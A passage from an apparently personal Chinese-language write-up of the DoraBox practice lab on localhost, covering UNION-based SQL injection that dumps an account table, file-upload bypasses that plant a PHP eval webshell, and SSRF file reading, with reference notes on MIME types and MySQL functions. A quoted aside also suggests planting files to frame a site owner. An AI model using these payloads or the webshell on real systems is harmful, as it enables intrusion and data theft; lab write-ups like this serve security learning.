&lt;p&gt;‘&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_search.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_search.php&lt;/a&gt;&lt;br&gt;
?content=’ or ‘%’=’&lt;br&gt;
&amp;amp;submit=submit’&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断需要的字段数 3 个（感觉这种方法有点低级）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_search.php ?content=&#39; union select 1,2,3 and &#39;%&#39;=&#39;  &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆表，常规手段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT * FROM news WHERE content like &#39;%$$$$$$&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#39;%&#39;=&#39; %&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆字段&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$&#39; union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = &#39;account&#39; and &#39;%&#39;=&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆内容&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$&#39; union select 1,2, concat_ws(&#39;--&#39;,id,rest,own) from account where &#39;%&#39;=&#39; &amp;amp;submit=submit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlss006.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;sql 通配符&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;通配符&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;%&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代 0 个或多个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;_&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;替代一个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[&lt;em&gt;charlist&lt;/em&gt;]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;[^&lt;em&gt;charlist&lt;/em&gt;] 或 [!&lt;em&gt;charlist&lt;/em&gt;]&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;不在字符列中的任何单一字符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;js限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js限制文件上传&#34;&gt;#&lt;/a&gt; JS 限制文件上传&lt;/h1&gt;
&lt;p&gt;前端进行了文件名后缀过滤&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_js003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;打开源代码，把蓝色框部分内容删除，即绕过验证函数&lt;img src=&#34;dorabox_fp_js002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;li&gt;上传成功，路径告诉了，菜刀直连&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_js001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;遇见了一个问题，还没有解决：&lt;/p&gt;
&lt;p&gt;为什么修改 js 代码，加上 |.php 不生效，而删除函数验证一改一个准？&lt;/p&gt;
&lt;p&gt;据说就是不可以改（小菜菜，要在前端控制台输入该函数，才会生效）&lt;/p&gt;
&lt;h1 id=&#34;任意文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件上传&#34;&gt;#&lt;/a&gt; 任意文件上传&lt;/h1&gt;
&lt;p&gt;随便传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_all001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;p&gt;根据题目提示，获取到文件上传的路径，用菜刀直接连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_all002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传的 php 一句话木马 attack.php：&lt;/p&gt;
&lt;p&gt;&lt;code&gt; &amp;lt;?php @eval($_POST[&#39;attack&#39;]) ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;php 一句话木马基本原理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;@表示后面即使执行错误，也不报错 ($_POST [attack] 如果不加 @会报错，因为 attack 变量没有定义就被使用了，报错会暴露密码)&lt;/li&gt;
&lt;li&gt;eval () 函数，括号内的语句字符串什么的都当做代码执行&lt;/li&gt;
&lt;li&gt;$_POST [‘attack’] 表示以 post 的方式接收变量 attack，把变量 attack 里面的字符串当做 php 代码执行。例如，若接收到参数 attack=echo ‘attack’，此时代码变为 eval (“echo ‘attack’;”)，就会输出 attack&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TruBW 博主举的常用的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;你想查看目标硬盘里有没有小黄片，可以用 php 函数： &lt;code&gt;opendir()&lt;/code&gt;  和 &lt;code&gt;readdir()&lt;/code&gt;  等等。想上传点小黄片，诬陷站主，就用 php 函数： &lt;code&gt;move_uploaded_file&lt;/code&gt; ，当然相应的 html 要写好。你想执行 cmd 命令，则用 &lt;code&gt;exec()&lt;/code&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;mime限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mime限制文件上传&#34;&gt;#&lt;/a&gt; MIME 限制文件上传&lt;/h1&gt;
&lt;p&gt;.jpg 可以上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_mime001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;打开网络抓包，把后缀修改为.php&lt;img src=&#34;dorabox_fp_mime002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;li&gt;上传成功，菜刀直连&lt;img src=&#34;dorabox_fp_mime003.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;MIME 介绍：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定的应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。（来自百度百科）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见的类型：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件类型&lt;/th&gt;
&lt;th&gt;后缀&lt;/th&gt;
&lt;th&gt;数据包中的文件类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;超文本标记语言文本&lt;/td&gt;
&lt;td&gt;.html&lt;/td&gt;
&lt;td&gt;text/html&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;xml 文档&lt;/td&gt;
&lt;td&gt;.xml&lt;/td&gt;
&lt;td&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;xhtml 文档&lt;/td&gt;
&lt;td&gt;.xhtml&lt;/td&gt;
&lt;td&gt;application/xhtml+xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;普通文本文档&lt;/td&gt;
&lt;td&gt;.text&lt;/td&gt;
&lt;td&gt;text/plain&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RTF 文本&lt;/td&gt;
&lt;td&gt;.rtf&lt;/td&gt;
&lt;td&gt;application/rtf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PDF 文档&lt;/td&gt;
&lt;td&gt;.pdf&lt;/td&gt;
&lt;td&gt;application/pdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Miscrosoft Word 文件&lt;/td&gt;
&lt;td&gt;.word&lt;/td&gt;
&lt;td&gt;application/msword&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PNG 图像&lt;/td&gt;
&lt;td&gt;.png&lt;/td&gt;
&lt;td&gt;image/png&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GIF 图形&lt;/td&gt;
&lt;td&gt;.gif&lt;/td&gt;
&lt;td&gt;image/gif&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JPEG 图形&lt;/td&gt;
&lt;td&gt;.jpeg,.jpg&lt;/td&gt;
&lt;td&gt;image/jpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;au 声音文件&lt;/td&gt;
&lt;td&gt;.au&lt;/td&gt;
&lt;td&gt;audio/basic&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MIDI 音乐文件&lt;/td&gt;
&lt;td&gt;mid,.midi&lt;/td&gt;
&lt;td&gt;audio/midi,audio/x-midi&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RealAudio 音乐&lt;/td&gt;
&lt;td&gt;.ra,.ram&lt;/td&gt;
&lt;td&gt;audio/x-pn-realaudio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AVI 文件&lt;/td&gt;
&lt;td&gt;.avi&lt;/td&gt;
&lt;td&gt;video/x-msvideo&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GZIP 文件&lt;/td&gt;
&lt;td&gt;.gz&lt;/td&gt;
&lt;td&gt;application/x-gzip&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TAR 文件&lt;/td&gt;
&lt;td&gt;.tar&lt;/td&gt;
&lt;td&gt;application/x-tar&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;任意的二进制数据&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;application/octet-stream&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;出现在 HTTP 数据包中可能有的位置（不是很有画面感…）：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;MIME 信息头有：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MIME-Version:&lt;/p&gt;
&lt;p&gt;这个头提供了所用 MIME 的版本号。这个值习惯上为 1.0。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Type:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它定义了数据的类型，以便数据能被适当的处理。有效的类型有：text，image，audio，video，applications，multipart 和 message。注意任何一个二进制附件都应该被叫做 application/octet- stream。这个头的一些用例为：image/jpg, application/mswork，multipart/mixed，这只是很少的一部分。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Transfer-Encoding:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是所有头中最重要的一个，因为它说明了对数据所执行的编码方式，客户 / MUA 将用它对附件进行解码。对于每个附件，可以使用 7bit，8bit，binary ，quoted-printable，&lt;a href=&#34;https://baike.baidu.com/item/base64&#34;&gt;base64&lt;/a&gt; 和 custom 中的一种编码方式。7bit 编码是用在 US ASCII&lt;a href=&#34;https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86&#34;&gt; 字符集&lt;/a&gt;上的常用的一种编码方式，也就是，保持它的原样。8bit 和 binary 编码一般不用。对人类可读的标准文本，如果传输要经过对格式有影响的&lt;a href=&#34;https://baike.baidu.com/item/%E7%BD%91%E5%85%B3&#34;&gt;网关&lt;/a&gt;时对其进行保护，可以使用 quoted printable 。Base64 是一种通用方法，在需要决定使用哪一种编码方法时，它提供了一个不用费脑子的选择；它通常用在二进制，非文本数据上。注意，任何非 7bit 数据必须用一种模式编码，这样它就可以通过 Internet&lt;a href=&#34;https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3&#34;&gt; 邮件网关&lt;/a&gt;！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-ID:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果 Content-Type 是 message/external-body 或 multipart/alternative 时，这个头就有用了，它超出了本文的范围。&lt;/p&gt;
&lt;h3 id=&#34;content-description&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#content-description&#34;&gt;#&lt;/a&gt; Content-Description:&lt;/h3&gt;
&lt;p&gt;这是一个可选的头。它是任何信息段内容的自由文本描述。描述必须使用 us-ascii 码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Disposition:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个试验性的头，它用于给客户程序 / MUA 提供提示，来决定是否在行内显示附件或作为单独的附件。&lt;/p&gt;
&lt;p&gt;MIME 段头（出现在实际的 MIME 附件部分的头），除了 MIME-Version 头，可以拥有以上任何头字段。如果一个 MIME 头是信息块的一部分，它将作用于整个信息体。例如，如果 Content-Transfer-Encoding 显示在信息（指整个信息）头中，它应用于整个信息体，但是如果它显示在一个 MIME 段里，它 &amp;quot;只能&amp;quot; 用于那个段中。&lt;/p&gt;
&lt;p&gt;注意：其可以对自动对收到的&lt;a href=&#34;https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6&#34;&gt;邮件&lt;/a&gt;进行解密。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[以上拓展来自这里&lt;/p&gt;
&lt;h1 id=&#34;拓展名限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#拓展名限制文件上传&#34;&gt;#&lt;/a&gt; 拓展名限制文件上传&lt;/h1&gt;
&lt;p&gt;后台进行了文件名后缀过滤，无法上传.php 文件&lt;/p&gt;
&lt;h2 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;尝试大小写绕过，把文件名后缀改为.phP，上传成功，菜刀直连&lt;img src=&#34;dorabox_fp_hz001.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-6&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;因为写过 upload_labs (没写完)，就有思路&lt;/p&gt;
&lt;h1 id=&#34;内容限制文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内容限制文件上传&#34;&gt;#&lt;/a&gt; 内容限制文件上传&lt;/h1&gt;
&lt;p&gt;对文件内容进行判读过滤&lt;/p&gt;
&lt;h2 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在木马文件最前面加上 GIF89a:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GIF89a &amp;lt;?php @eval($_POST[&#39;attack&#39;]) ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上传成功，路径告诉了，菜刀直连&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_fp_nr001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-7&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;GIF89a 是文件头校验内容，服务器看到这里就会以为是 GIF 文件。&lt;/p&gt;
&lt;p&gt;常见的文件头对应关系（入职培训上的，这个我以前还找过，就是因为菜，没有找到）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;JPEG;.JPE;.JPG，”JPGGraphic File”&lt;/li&gt;
&lt;li&gt;gif，”GIF 89A”&lt;/li&gt;
&lt;li&gt;zip，”Zip Compressed”&lt;/li&gt;
&lt;li&gt;doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;sqli数字手工注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli数字手工注入&#34;&gt;#&lt;/a&gt; SQLi 数字手工注入&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlnum001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;输出报错：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php?id=1&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php?id=1&lt;/a&gt; order by 4 &amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum007.png&#34; alt=&#34;&#34;&gt; 正常输出：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id=1 order by 3 &amp;amp;submit=submit&lt;/p&gt;
&lt;p&gt;以上说明，应输出 3 个字段&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用 count (*) 统计表内数据，只有两条数据：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php?id=3&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php?id=3&lt;/a&gt; union select 10086,count(*),10087 from news order by 1 desc limit 1&lt;br&gt;
&amp;amp;submit=submit&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_sqlnum002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆数据库&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id=1 union select 3,database(),user() order by 1 desc limit 1&lt;br&gt;
&amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆表名，利用 group_concat ()：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php?id=1&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php?id=1&lt;/a&gt; union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc&lt;br&gt;
&amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆字段：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = ‘account’ order by 1 desc&lt;br&gt;
&amp;amp;submit=submit&lt;img src=&#34;dorabox_sqlnum005.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://localhost/dorabox/sql_injection/sql_num.php&#34;&gt;http://localhost/dorabox/sql_injection/sql_num.php&lt;/a&gt;&lt;br&gt;
?id = 1 union select 3,concat_ws(&amp;quot;,&amp;quot;,id,rest,own),0 from account where 1=1 order by 1 desc&lt;img src=&#34;dorabox_sqlnum006.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-8&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;mysql 字符拼接方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;concat()&lt;/p&gt;
&lt;p&gt;功能：将多个字符串连接成一个字符串&lt;/p&gt;
&lt;p&gt;语法：concat (str1, str2, …)&lt;/p&gt;
&lt;p&gt;说明：返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;concat_ws()&lt;/p&gt;
&lt;p&gt;功能：将多个字符串拼接成一个字符串，以自定义的符号进行分割&lt;/p&gt;
&lt;p&gt;语法：concat (separator, str1, str2, …)&lt;/p&gt;
&lt;p&gt;说明：第一个参数指定分隔符，若为 null, 返回结果也会为 null&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;group_concat()&lt;/p&gt;
&lt;p&gt;功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果&lt;/p&gt;
&lt;p&gt;语法：group_concat ([distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’] )&lt;/p&gt;
&lt;p&gt;说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 句子；separator 是一个字符串，缺省为一个逗号&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;information_schema&lt;/p&gt;
&lt;p&gt;information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括 “数据词典” 和 “系统目录”。&lt;/p&gt;
&lt;p&gt;常用表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;COLLATION_CHARACTER_SET_APPLICABILITY 表，和字符编码相关，包含的常用列：
&lt;ol&gt;
&lt;li&gt;COLLATION_NAME 排序规则明&lt;/li&gt;
&lt;li&gt;CHARACTER_SET_NAME 与排序规则关联的字符集的名称&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;TABLES 表，提供库中表信息，包含的常用列：
&lt;ol&gt;
&lt;li&gt;Table_catalog 数据表登记目录&lt;/li&gt;
&lt;li&gt;Table_schema 数据表所属的数据库名&lt;/li&gt;
&lt;li&gt;Table_name 表名&lt;/li&gt;
&lt;li&gt;Table_type 表类型 [system view | base table]&lt;/li&gt;
&lt;li&gt;Engine 使用的数据库引擎 [MyISAM | CSV | InnoDB]&lt;/li&gt;
&lt;li&gt;Version 版本，默认值 10&lt;/li&gt;
&lt;li&gt;Row_format 行格式 [Compact | Dynamic | Fixed]&lt;/li&gt;
&lt;li&gt;Table_rows 表里所存多少行数据 (早知道有这个，我就)&lt;/li&gt;
&lt;li&gt;Avg_row_length 平均行长度&lt;/li&gt;
&lt;li&gt;Data_length 数据长度&lt;/li&gt;
&lt;li&gt;Max_data_length 最大数据长度&lt;/li&gt;
&lt;li&gt;Index_length 索引长度&lt;/li&gt;
&lt;li&gt;Create_time 表的创建时间&lt;/li&gt;
&lt;li&gt;Update_time 表的更新时间&lt;/li&gt;
&lt;li&gt;Check_time 表的检查时间&lt;/li&gt;
&lt;li&gt;Table_collation 表的字符校验编码集&lt;/li&gt;
&lt;li&gt;Chechsum 校验和&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;COLUMNS 表，提供表中字段信息，包含的常用列：
&lt;ol&gt;
&lt;li&gt;TABLE_CATALOG 包含该列的表所属的目录名称。该值始终为 def。&lt;/li&gt;
&lt;li&gt;TABLE_SCHEMA 字段所在数据库的名称。&lt;/li&gt;
&lt;li&gt;TABLE_NAME 字段所在表的名称。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;COLUMN_NAME 字段的名称。&lt;/li&gt;
&lt;li&gt;ORDINAL_POSITION 表中字段的位置。（可能会用 order by ORDINAL_POSITION）COLUMN_TYPE 字段数据类型。&lt;/li&gt;
&lt;li&gt;COLUMN_DEFAULT 字段的默认值。如果字段具有显示缺省值 NULL，或者字段定义不含 DEFAULT 子句，则该值为 NULL。&lt;/li&gt;
&lt;li&gt;COLUMN_TYPE 类型名称以及别的信息，比如精度或长度（以字符为单位&lt;/li&gt;
&lt;li&gt;CHARACTER_OCTET_LENGTH 对于字符串列，最大长度（以字节为单位&lt;/li&gt;
&lt;li&gt;CHARACTER_MAXIMUM_LENGTH 对于字符串列，最大长度（以字符为单位） COLUMN_KEY 名称是否已建立索引&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_ssrf001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;利用 file 进行文件读取&lt;img src=&#34;dorabox_ssrf002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-9&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;其实就是有 url 的，需要访问别的资源的就可能有 ssrf 漏洞。&lt;/li&gt;
&lt;li&gt;利用方式（里面好多没试过的，等我写完报告要去玩玩）
&lt;ol&gt;
&lt;li&gt;利用 file 协议读取本地文件（类似文件包含，想要利用这个漏洞，需要知道里面有什么文件或者目录，然后进行内容提取）&lt;/li&gt;
&lt;li&gt;对服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息&lt;/li&gt;
&lt;li&gt;攻击运行在内网或本地的应用程序&lt;/li&gt;
